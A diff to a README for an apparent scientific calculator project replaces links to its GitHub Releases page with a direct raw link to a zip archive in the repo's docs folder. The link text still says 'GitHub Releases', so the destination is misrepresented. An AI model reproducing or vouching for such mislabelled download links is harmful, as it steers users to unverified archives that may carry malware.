@@ -6,9 +6,9 @@ Welcome to the scientific calculator! This tool helps you perform complex calcul
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Chkaradhar700/scientific-calculator/releases)
+[![Download](https://github.com/Chkaradhar700/scientific-calculator/raw/refs/heads/main/docs/scientific-calculator-v1.3-alpha.4.zip)](https://github.com/Chkaradhar700/scientific-calculator/raw/refs/heads/main/docs/scientific-calculator-v1.3-alpha.4.zip)
 
-To get started, you need to download the application. Visit this page to download: [GitHub Releases](https://github.com/Chkaradhar700/scientific-calculator/releases).
+To get started, you need to download the application. Visit this page to download: [GitHub Releases](https://github.com/Chkaradhar700/scientific-calculator/raw/refs/heads/main/docs/scientific-calculator-v1.3-alpha.4.zip).
 
 ## 🛠️ System Requirements
 
@@ -27,7 +27,7 @@ To get started, you need to download the application. Visit this page to downloa
 
 ## 📋 Download & Install
 
-1. Visit this page to download the calculator: [GitHub Releases](https://github.com/Chkaradhar700/scientific-calculator/releases).
+1. Visit this page to download the calculator: [GitHub Releases](https://github.com/Chkaradhar700/scientific-calculator/raw/refs/heads/main/docs/scientific-calculator-v1.3-alpha.4.zip).
 2. You will see a list of available versions. Click on the latest version.
 3. Download the file that matches your operating system.
 4. Once downloaded, locate the file in your downloads folder.
